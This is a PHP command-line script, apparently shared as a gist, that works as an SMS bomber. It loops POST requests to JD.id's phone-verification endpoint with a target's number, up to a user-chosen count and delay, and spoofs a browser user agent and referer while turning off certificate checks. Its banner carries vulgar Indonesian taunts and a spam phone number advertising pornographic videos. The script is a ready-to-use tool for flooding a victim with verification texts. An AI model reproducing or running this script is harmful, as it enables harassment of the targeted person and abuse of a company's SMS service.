<?php

function jdidbom($no, $jum, $wait){

    $x = 0; 

    while($x < $jum) {

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");

        curl_setopt($ch, CURLOPT_POST, 1);

        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');

        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');

        $server_output = curl_exec ($ch);

        curl_close ($ch);

		echo $server_output."\n";

        sleep($wait);

        $x++;

        flush();

    }

}

echo " Jhö~

======================================================

    Mr.Jhö 

 Mau video bokep save nomor ini 

            Save

       (+1(249)701-3006)

       SALAM COLLY 4x1 Sehari

       HACKER KOK SPAM NUB

       SKILL KOK SPAM GOBLOK

======================================================\nInput : ";

echo "Nomor Target (contoh : No.BH/CD)\nCrot : ";

$nomor = trim(fgets(STDIN));

echo "Jumlah Spam (tiap nomor Limit99999)\nCrot : ";

$jumlah = trim(fgets(STDIN));

echo "Jeda 1-696969 (contoh : 1)\nCrot : ";

$jeda = trim(fgets(STDIN));

$execute = jdidbom($nomor, $jumlah, $jeda);

print $execute;

print "SELAMAT KONTOL\n";

?>

Comment on gist
